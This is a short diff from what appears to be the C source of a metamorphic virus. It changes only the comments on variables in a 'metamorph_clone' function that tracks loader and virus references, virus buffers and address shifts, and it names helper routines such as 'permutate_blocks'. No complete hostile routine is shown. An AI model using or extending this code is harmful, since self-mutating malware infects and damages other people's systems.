@@ -132,12 +132,12 @@ bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_offset,
 	const size_t	dist_vircall_loader = vhdr->dist_vircall_loader;
 	const uint64_t	seed                = vhdr->seed;
 
-	struct safe_ptr	loader_ref;                                             // loader reference in clone (mutable)
-	struct safe_ptr	virus_ref;                                              // virus reference in clone (mutable)
-	struct safe_ptr	virus_buffer_ref;                                       // virus buffer reference; filled by permutate_blocks
-	size_t		virus_buffer_size;                                      // virus size in virus_buffer_ref
-	void		*virus_address;                                         // virus address in clone_ref
-	int32_t		virus_address_shift = 0;                                // virus address shift in clone_ref
+	struct safe_ptr	loader_ref;                                             // loader reference in clone, init by <init_loader_safe>
+	struct safe_ptr	virus_ref;                                              // virus reference in clone, init byt <init_virus_safe>
+	struct safe_ptr	virus_buffer_ref;                                       // virus buffer reference, filled by <permutate_blocks>
+	size_t		virus_buffer_size;                                      // virus size in virus_buffer_ref, init by <set_virus_buffer_size>
+	void		*virus_address;                                         // virus address in clone_ref, init by <get_virus_address>
+	int32_t		virus_address_shift = 0;                                // virus address shift in clone_ref, init by <permutate_blocks>
 
 	if (!init_loader_safe(&loader_ref, clone_ref, loader_offset, loader_size)
 	|| !init_virus_safe(&virus_ref, clone_ref, loader_offset, dist_virus_loader, *full_virus_size)
